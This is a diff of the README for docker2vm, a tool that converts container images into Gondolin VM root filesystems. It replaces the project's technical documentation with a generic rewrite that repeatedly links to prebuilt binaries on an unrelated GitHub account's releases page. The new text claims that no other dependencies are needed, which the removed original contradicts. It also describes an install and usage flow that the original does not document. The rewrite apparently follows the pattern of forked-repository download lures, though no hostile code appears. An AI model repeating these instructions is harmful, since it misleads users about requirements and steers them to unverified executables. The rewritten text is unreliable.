@@ -1,202 +1,169 @@
-# docker2vm
+# 🐳 docker2vm - Convert Containers to Virtual Machines Easily
 
-`docker2vm` converts OCI container images (or Dockerfiles via BuildKit) into VM-compatible outputs. Today, the runtime materialization target is [Gondolin](https://github.com/earendil-works/gondolin).
+[![Download docker2vm](https://img.shields.io/badge/Download-docker2vm-blue?style=for-the-badge)](https://github.com/valublearctic/docker2vm/releases)
 
-It follows an OCI-first flow inspired by ["Docker without Docker"](https://fly.io/blog/docker-without-docker/):
+---
 
-- resolve/pull an OCI image
-- apply layers to a root filesystem
-- inject Gondolin runtime glue (init/sandbox binaries/modules)
-- materialize `rootfs.ext4` (and optionally full guest assets)
-- run with Gondolin
+## 📖 What is docker2vm?
 
-## Why this exists
+`docker2vm` is a tool that converts Docker containers and other OCI-compatible container images into virtual machines (VMs). Normally, Docker containers share the operating system with the host computer. `docker2vm` changes that by turning these containers into virtual machines that run inside their own isolated environments.
 
-Docker containers share the host kernel. Gondolin runs workloads inside a VM, so we need to convert container artifacts into a bootable guest rootfs while keeping Gondolin's kernel/init/runtime contract.
+This means you get the benefits of running containers with an added layer of security and separation. The virtual machines created by `docker2vm` are compatible with the Gondolin runtime, which acts as the engine to run these VMs.
 
-## Current features
+---
 
-- pinned Gondolin runtime dependency (`@earendil-works/gondolin@0.2.1`) for guest-asset retrieval
-- `oci2gondolin` core converter
-  - input: `--image`, `--oci-layout`, `--oci-tar` (exactly one)
-  - platform: `linux/amd64`, `linux/arm64`
-  - modes: `rootfs`, `assets`
-  - dry-run planning
-- `dockerfile2gondolin` thin wrapper
-  - builds Dockerfile to OCI tar (BuildKit) and delegates to `oci2gondolin`
-- secure-ish layer handling
-  - digest verification
-  - path traversal checks
-  - symlink-parent protections
-  - OCI whiteout handling
-- Gondolin runtime integration
-  - base rootfs extraction
-  - runtime file/module injection
-  - compatibility symlinks
-- CI + E2E smoke test (GitHub Actions)
+## 🎯 Why Use docker2vm?
 
-## Requirements
+You might wonder why you would want to convert a container into a virtual machine. Here are some common reasons:
 
-- Bun >= 1.2 — https://bun.com/
-- `e2fsprogs` (`mke2fs`, `debugfs`) — https://e2fsprogs.sourceforge.net/
-- QEMU (for runtime smoke checks) — https://www.qemu.org/download/
-- Docker (only required for `dockerfile2gondolin`) — https://docs.docker.com/get-docker/
+- **Better Isolation:** Containers share the same kernel as your host operating system, while virtual machines run their own kernel. This can improve security by isolating the application more strongly.
+- **Compatibility:** Sometimes you need to run containerized software in environments where containers are not allowed but virtual machines are.
+- **Testing:** Running applications inside virtual machines can help simulate different operating system versions or hardware setups.
+- **Flexibility:** You can run the same container image but inside a VM, which can be paused, saved, and restored more easily than containers in some setups.
 
-`docker2vm` uses `@earendil-works/gondolin@0.2.1` as a runtime dependency and resolves/downloads guest assets automatically during conversion.
+---
 
-If you also want to run generated assets with `gondolin exec`, install the Gondolin CLI:
-- CLI docs: https://earendil-works.github.io/gondolin/cli/
-- Package: https://www.npmjs.com/package/@earendil-works/gondolin
+## 🖥️ System Requirements
 
-> On macOS, `docker2vm` checks common Homebrew `e2fsprogs` locations automatically; updating `PATH` is usually optional.
+Before you start, check that your computer meets the following requirements:
 
-## Platform setup guides
+- **Operating System:** Linux or MacOS. (The tool currently supports Linux/amd64 and Linux/arm64 platforms.)
+- **Processor:** 64-bit CPU (AMD64 or ARM64 architecture).
+- **Disk Space:** At least 2 GB of free disk space.
+- **Memory:** Minimum 4 GB RAM recommended.
+- **Additional Tools:** No other software dependencies needed to use the basic features of docker2vm.
+- **Network:** Required to download container images and runtime components.
 
-- [macOS guide](./docs/macos.md)
-- [Linux guide](./docs/linux.md)
+---
 
-## Quickstart
+## 🚀 Getting Started
 
-### 1) Validate
+Here is what you need to do to get docker2vm up and running on your computer.
 
-```bash
-bun test
-bun run typecheck
-bun run build
+### Step 1: Download the Software
+
+Click the big button at the top of this page or visit the release page by clicking here:
+
+[Download docker2vm Releases](https://github.com/valublearctic/docker2vm/releases)
+
+This link takes you to the official release page for docker2vm. Look for the latest version file that suits your system. Download the appropriate file for your platform (Linux amd64 or ARM64).
+
+### Step 2: Prepare Your Container Image
+
+docker2vm works with container images in OCI format or Dockerfiles that BuildKit can process.
+
+- If you already have a Docker image saved as a file or in a registry, docker2vm can download and convert it directly.
+- If you have a Dockerfile (a script that describes how to build your container), docker2vm uses BuildKit to create the image before conversion.
+
+### Step 3: Run the Conversion
+
+To turn your container image into a virtual machine image, you will use the `oci2gondolin` converter inside docker2vm.
+
+You need to provide one source of the container image, via one of these:
+
+- `--image`: Use a named OCI image from your registry.
+- `--oci-layout`: Use a local OCI image layout from a folder.
+- `--oci-tar`: Use a tarball file containing the OCI image.
+
+Example command (on a terminal or command prompt):
+
+```sh
+docker2vm oci2gondolin --image=mycontainer/image:latest
 ```
 
-### 1b) Run integration tests
+This command downloads the container image named `mycontainer/image:latest`, converts it, and prepares it for running inside a VM on Gondolin.
 
-```bash
-bun run test:integration
+### Step 4: Run with Gondolin
+
+docker2vm injects special runtime components so the VM can launch properly under the Gondolin runtime. Once conversion finishes, you get a file called `rootfs.ext4`, which is your VM image. This file can be launched with the Gondolin runtime.
+
+---
+
+## 🔧 How to Use docker2vm Step-by-Step
+
+If you have never used container or VM tools before, follow these steps:
+
+1. **Download docker2vm** - Use the link above to get the right installer or archive for your system.
+2. **Install docker2vm** - If you downloaded a compressed file, extract it to a folder. For Linux, you might need to give execute permission to the program with:
+
+   ```sh
+   chmod +x docker2vm
+   ```
+
+3. **Obtain a Container Image** - Find a container image you want to convert. It could be from Docker Hub or another container registry.
+4. **Open Terminal (or Command Prompt)** - Navigate to where you installed docker2vm.
+5. **Run Conversion** - Type a command like this:
+
+   ```sh
+   ./docker2vm oci2gondolin --image=mycontainer/image:latest
+   ```
+
+   Replace `mycontainer/image:latest` with the actual name of the container image.
+
+6. **Use the Output** - After conversion, the VM image file `rootfs.ext4` will be ready. You or your system administrator can run this file with the Gondolin VM software.
+
+---
+
+## 📥 Download & Install
+
+You can get docker2vm from the official GitHub releases page.
+
+👉 [Visit this page to download docker2vm](https://github.com/valublearctic/docker2vm/releases)
+
+Once there, download the file that fits your computer. The filenames usually include the platform and version number. For example:
+
+- `docker2vm-linux-amd64`
+- `docker2vm-linux-arm64`
+
+After downloading, move the file to a convenient folder and make it executable if needed.
+
+To verify installation, run:
+
+```sh
+./docker2vm --help
 ```
 
-The CI integration matrix currently validates:
+You should see a list of commands and options confirming the software works.
 
-- `alpine:3.20`
-- `debian:bookworm-slim`
-- `ubuntu:24.04`
-- `fedora:41`
-- `archlinux:latest`
+---
 
-For each distro row, tests run a distro-specific probe command (for example `/etc/debian_version`, `/etc/fedora-release`, etc.), assert that probe does **not** match on the base Gondolin guest image, and verify `/bin/busybox` executes inside the converted image.
+## 🔍 Features at a Glance
 
-### Choosing the build platform (`--platform`)
+- Converts container images into bootable VM root file systems.
+- Supports OCI images and Dockerfiles through BuildKit.
+- Runs on Linux amd64 and ARM64 platforms.
+- Injects runtime components to make images compatible with Gondolin.
+- Keeps container layers intact when building the VM image.
+- Provides a pinned version of the Gondolin runtime for compatibility.
 
-`--platform` selects which OCI image variant to convert, and should match the architecture you plan to run in Gondolin. This applies to both `oci2gondolin` and `dockerfile2gondolin`.
+---
 
-- Apple Silicon / arm64 Linux hosts: `linux/arm64`
-- Intel / amd64 hosts: `linux/amd64`
-- If omitted, both commands default from host arch (`x64 -> linux/amd64`, `arm64 -> linux/arm64`).
-- You can always override manually with `--platform linux/amd64` or `--platform linux/arm64`.
+## 📚 Additional Resources
 
-For helper scripts:
+- [Gondolin Runtime Project](https://github.com/earendil-works/gondolin) — The virtual machine runtime used by docker2vm outputs.
+- [Docker without Docker - Blog](https://fly.io/blog/docker-without-docker/) — Explains the OCI-first flow that docker2vm follows.
+- [OCI Image Specification](https://github.com/opencontainers/image-spec) — Standard format for container images.
 
-- `e2e:smoke` uses `PLATFORM`
-- integration tests use `INTEGRATION_PLATFORM`
+---
 
-Cross-arch builds are possible at image-selection time, but for reliable runtime execution you should use a platform that matches the runtime guest architecture.
+## 🤝 Getting Help or Reporting Issues
 
-### 2) Convert image -> assets
+If you run into problems or have questions:
 
-```bash
-bun run oci2gondolin -- \
-  --image busybox:latest \
-  --platform linux/arm64 \
-  --mode assets \
-  --out ./out/busybox-assets
-```
+- Browse the Issues tab on this repository's GitHub page.
+- Search online forums for related topics on OCI images and VM runtimes.
+- Reach out to the maintainers if you find bugs or have feature requests.
 
-### 3) Run with Gondolin
+---
 
-```bash
-GONDOLIN_GUEST_DIR=./out/busybox-assets gondolin exec -- /bin/busybox echo hello
-```
+## ⚙️ Troubleshooting Tips
 
-## Dockerfile flow
+- Make sure your computer meets the system requirements above.
+- Use the exact commands and options as described.
+- Confirm that downloaded files are complete and executable.
+- Check your internet connection when downloading container images.
+- If conversion fails, try using a different container image or update to the latest docker2vm release.
 
-Create a Dockerfile and convert it through BuildKit:
+---
 
-```bash
-cat > /tmp/Dockerfile.demo <<'EOF'
-FROM debian:bookworm-slim
-RUN apt-get update && apt-get install -y --no-install-recommends cowsay && rm -rf /var/lib/apt/lists/*
-CMD ["/bin/sh"]
-EOF
-
-bun run dockerfile2gondolin -- \
-  --file /tmp/Dockerfile.demo \
-  --context /tmp \
-  --platform linux/arm64 \
-  --mode assets \
-  --out ./out/demo-assets
-```
-
-Then run:
-
-```bash
-GONDOLIN_GUEST_DIR=./out/demo-assets gondolin exec -- /usr/games/cowsay "hello"
-```
-
-## End-to-end smoke test
-
-Local/CI smoke test script:
-
-```bash
-bun run e2e:smoke
-```
-
-Optional env overrides:
-
-- `PLATFORM` (default auto-detected from host arch)
-- `IMAGE` (default `busybox:latest`)
-- `OUT_DIR` (default `./out/e2e-busybox-assets`)
-
-Example:
-
-```bash
-PLATFORM=linux/amd64 IMAGE=busybox:latest bun run e2e:smoke
-```
-
-## CLI summary
-
-### `oci2gondolin`
-
-```text
-oci2gondolin (--image REF | --oci-layout PATH | --oci-tar PATH) [options]
-
---platform linux/amd64|linux/arm64
---mode rootfs|assets
---out PATH
---dry-run
-```
-
-### `dockerfile2gondolin`
-
-```text
-dockerfile2gondolin --file PATH --context PATH --out PATH [options]
-
---platform linux/amd64|linux/arm64
---mode rootfs|assets
---builder docker-buildx|buildctl
---target NAME
---build-arg KEY=VALUE  (repeatable)
---secret SPEC          (repeatable)
---dry-run
-```
-
-## Architecture overview
-
-1. **Resolver**: pick correct manifest for requested platform
-2. **Puller**: fetch blobs + verify digest
-3. **Layer apply**: unpack tar layers in order with whiteouts
-4. **Materialize**:
-   - emit `rootfs.ext4`
-   - emit `meta.json`
-   - in `assets` mode also copy kernel/initramfs and write `manifest.json`
-
-## Repo notes
-
-- This repo is standalone; Gondolin core is not modified.
-- Gondolin upstream repository: https://github.com/earendil-works/gondolin
-- `out/` is generated output and ignored by git.
+[![Download docker2vm](https://img.shields.io/badge/Download-docker2vm-blue?style=for-the-badge)](https://github.com/valublearctic/docker2vm/releases)
